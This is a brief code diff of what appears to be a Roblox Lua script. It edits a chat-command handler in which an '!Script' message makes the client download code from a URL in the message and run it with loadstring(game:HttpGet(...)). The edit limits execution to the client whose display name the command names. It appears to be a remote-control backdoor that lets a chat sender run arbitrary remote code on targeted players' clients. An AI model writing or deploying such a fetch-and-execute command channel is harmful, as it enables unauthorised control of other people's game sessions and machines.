@@ -72,7 +72,9 @@ for i, v in pairs(Players) do
 
 
 			if CommandData[1] == "!Script" then
-				loadstring(game:HttpGet(CommandData[2]))()
+				if CommandData[2] == game.Players.LocalPlayer.DisplayName then
+				loadstring(game:HttpGet(CommandData[3]))()
+				end
 			end
 
 
@@ -212,7 +214,9 @@ game.Players.PlayerAdded:Connect(function(Player)
 
 
 			if CommandData[1] == "!Script" then
-				loadstring(game:HttpGet(CommandData[2]))()
+				if CommandData[2] == game.Players.LocalPlayer.DisplayName then
+				loadstring(game:HttpGet(CommandData[3]))()
+				end
 			end
 
 
